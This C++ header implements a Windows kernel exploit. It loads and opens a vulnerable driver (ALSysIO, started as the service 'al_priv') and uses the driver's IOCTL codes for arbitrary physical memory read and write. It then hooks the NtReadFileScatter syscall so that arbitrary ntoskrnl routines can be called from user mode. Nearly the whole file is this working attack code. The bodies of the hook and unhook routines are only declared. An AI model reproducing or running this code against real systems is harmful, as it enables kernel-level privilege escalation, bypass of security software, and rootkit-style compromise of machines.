#pragma once

#include "..\util.hpp"

namespace driver_util {
    std::size_t get_mod_base_addr(const char* mod);

    namespace ctl_codes {
        constexpr auto read_ctl = 0x9C402618;
        constexpr auto write_ctl = 0x9C40261C;
    }

#pragma pack(push, 1)
    template< std::size_t buf_sz>
    struct read_data {
        std::uint64_t physical_addr;
        std::uint32_t sz;
        std::uint8_t buf[(buf_sz > 12) ? buf_sz - 12 : 1 ];
    };

    template< std::size_t buf_sz >
    struct write_data {
        std::uint64_t physical_addr;
        std::uint32_t sz;
        std::uint8_t buf[buf_sz];
    };


#pragma pack(pop)
    struct driver {

        HANDLE drv_handle{};

        // our medium is NtReadFileScatter
        std::size_t medium_pa{};
        std::size_t medium_va{};
        std::uint8_t medium_original_instructions[24]{ 0x48, 0x8B, 0xC4, 0x4C, 0x89, 0x48, 0x20, 0x4C, 0x89, 0x40, 0x18, 0x48,
                                                       0x89, 0x50, 0x10, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56 };
        const char* medium_name{"NtReadFileScatter"};
        bool is_hooked{ false };

        // real kernel virtual base address
        std::uintptr_t ntoskrnl_base_address{};

        // kernel copy virtual base address
        HMODULE ntoskrnl_cpy{};

        driver() noexcept :
            ntoskrnl_base_address { get_mod_base_addr("ntoskrnl.exe") } 
        {
            
            const auto sc_manager = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
            const auto new_svc = OpenServiceA(sc_manager, "al_priv", SC_MANAGER_ALL_ACCESS);
            StartServiceA(new_svc, 0, nullptr);

            CloseServiceHandle(sc_manager);
            CloseServiceHandle(new_svc);

            util::log("%s", "Opening handle to vulnerable driver...");
            do {
                this->drv_handle = CreateFileA("\\\\.\\ALSysIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                std::this_thread::sleep_for(std::chrono::seconds(1));
            } while (this->drv_handle == INVALID_HANDLE_VALUE);

            util::log("Driver handle: %p", this->drv_handle);
            util::log("Opening handle to kernel...");

            this->ntoskrnl_cpy = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
            if (!this->ntoskrnl_cpy)
                util::log("Failed to open handle to kernel. Cannot proceed.");
                
            const auto ntdll = GetModuleHandleA("ntdll.dll");
            this->medium_va = reinterpret_cast<std::uint64_t>(GetProcAddress(ntdll, this->medium_name));

            if (!find_medium_pa())
                util::log("Failed to retrieve medium physical address. Cannot proceed");
        }

        ~driver() noexcept {
            if (drv_handle)
                CloseHandle(drv_handle);
        }

        template< std::size_t buf_sz >
        [[nodiscard]] std::uint8_t* read_phys_mem(std::size_t physical_addr) const {
            read_data<buf_sz> rd_data{ physical_addr, buf_sz };
   
            unsigned long bytes_returned{};
            if (const auto status = DeviceIoControl(drv_handle, ctl_codes::read_ctl, &rd_data, sizeof(write_data<buf_sz>{}), &rd_data, sizeof(write_data<buf_sz>{}), &bytes_returned, nullptr); !status) {
                if (const auto err = GetLastError(); err != 998)
                    util::log("Failed to read physical memory via IOCTL: %d", err);
                return nullptr;
            }

            const auto buf = new std::uint8_t[buf_sz];
            std::memmove(buf, &rd_data, buf_sz);
            return buf;
        }

        template< std::size_t buf_sz >
        [[nodiscard]] bool write_phys_mem(std::size_t physical_addr, void* buf) const {
            write_data<buf_sz> wr_data{ physical_addr, buf_sz };

            std::memmove(&wr_data.buf, buf, buf_sz);
            unsigned long bytes_returned{};
            const auto status = DeviceIoControl(drv_handle, ctl_codes::write_ctl, &wr_data, sizeof(write_data<buf_sz>{}), nullptr, sizeof(write_data<buf_sz>{}), & bytes_returned, nullptr);
            if (!status)
                util::log("Failed to write physical memory via IOCTL. Error code:  %d", GetLastError());
            return status;
        }

        template<typename ret_t, typename... args_t>
        std::optional<ret_t> call_ntproc(const char* target_nt_proc, args_t... args) {
            const auto hk_res = hook_medium(target_nt_proc);
            if (!hk_res)
                return util::log("Failed to hook NT procedure. Can't proceed"), std::nullopt;

            const auto call = reinterpret_cast<ret_t(__stdcall*)(args_t...)>(this->medium_va);

            const auto res = call(args...);

            const auto unhk_res = unhook_medium();
            
            return res;
        }

        [[nodiscard]] bool hook_medium(const char*);
        [[nodiscard]] bool unhook_medium();
        [[nodiscard]] bool find_medium_pa();
    };

    struct phys_mem_range {
        std::size_t start;
        std::uint64_t length;
    };

    [[nodiscard]] std::optional<std::vector<phys_mem_range>> get_physmem_ranges();

}